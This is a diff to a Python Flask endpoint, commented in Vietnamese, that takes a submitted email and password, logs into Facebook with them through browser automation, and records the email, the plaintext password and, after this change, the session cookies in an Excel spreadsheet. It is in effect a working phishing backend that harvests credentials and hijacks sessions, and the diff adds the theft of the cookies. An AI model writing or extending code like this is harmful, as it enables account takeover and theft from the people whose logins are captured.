@@ -48,30 +48,33 @@ def login():
     if not email or not password:
         return jsonify({"success": False, "error": "Missing email or password"}), 400
 
-    # Lưu vào file Excel
+    # Gọi hàm login Facebook và trả về HTML + cookies để client hiển thị / lưu
     try:
-        if not os.path.exists(FILE_NAME):
-            wb = Workbook()
-            ws = wb.active
-            ws.append(["Email", "Password"])
-            wb.save(FILE_NAME)
-
-        wb = load_workbook(FILE_NAME)
-        ws = wb.active
-        ws.append([email, password])
-        wb.save(FILE_NAME)
-    except Exception as e:
-        return jsonify({"success": False, "error": f"Failed to save to Excel: {str(e)}"}), 500
-    
-    # Gọi hàm login Facebook và trả về HTML để client hiển thị
-    try:
-        html = get_facebook_page_after_login(
+        result = get_facebook_page_after_login(
             username=email,
             password=password,
             headless=False,          # Để False để có thể thấy captcha/2FA và tương tác nếu cần
             timeout=300000            # Thời gian chờ tối đa 5 phút (tăng thêm để dễ trả về HTML)
         )
-        
+
+        html = result.get("html") if isinstance(result, dict) else ""
+        cookies = result.get("cookies") if isinstance(result, dict) else ""
+
+        # Lưu vào file Excel (cột 3 là cookies nếu có)
+        try:
+            if not os.path.exists(FILE_NAME):
+                wb = Workbook()
+                ws = wb.active
+                ws.append(["Email", "Password", "Cookies"])
+                wb.save(FILE_NAME)
+
+            wb = load_workbook(FILE_NAME)
+            ws = wb.active
+            ws.append([email, password, cookies or ""])
+            wb.save(FILE_NAME)
+        except Exception as e:
+            return jsonify({"success": False, "error": f"Failed to save to Excel: {str(e)}"}), 500
+
         if html:
             return jsonify({"success": True, "html": html})
         else:
@@ -79,7 +82,7 @@ def login():
                 "success": False,
                 "error": "Không lấy được HTML sau khi đăng nhập Facebook."
             }), 500
-    
+
     except Exception as e:
         return jsonify({"success": False, "error": f"Error during Facebook automation: {str(e)}"}), 500
 
